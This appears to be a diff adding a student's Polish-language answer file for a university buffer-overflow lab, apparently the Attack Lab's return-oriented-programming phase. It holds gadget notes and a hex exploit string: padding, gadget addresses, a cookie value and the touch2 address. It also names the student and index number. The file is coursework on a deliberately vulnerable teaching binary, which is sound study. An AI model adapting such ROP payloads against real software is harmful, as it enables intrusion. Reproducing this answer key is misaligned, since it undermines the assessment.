@@ -1,0 +1,29 @@
+/*
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Cezary Świtała, 316746
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+ */
+
+ /* Przydatne obserwacje:
+    * pierwsza instrukcja w setval_339 od 2 bitu koduje:
+      58                      popq   %rax
+      90                      nop
+      C3                      retq
+    * pierwsza instrukcja w addval_386 od 2 bitu koduje:
+      48 89 c7                movq   %rax, %rdi
+      90                      nop
+*/
+
+
+01 02 03 04 05 06 07 08 /* wypełnienie bufora */
+01 02 03 04 05 06 07 08 /* wypełnienie bufora */
+01 02 03 04 05 06 07 08 /* wypełnienie bufora */
+01 02 03 04 05 06 07 08 /* wypełnienie bufora */
+01 02 03 04 05 06 07 08 /* wypełnienie bufora */
+CB 1D 40 00 00 00 00 00 /* adres setval_339 + 2 */
+6B 47 68 61 00 00 00 00 /* wartość ciasteczka */
+A4 1D 40 00 00 00 00 00 /* adres addval_386 + 2 */
+33 1C 40 00 00 00 00 00 /* adres touch2 */
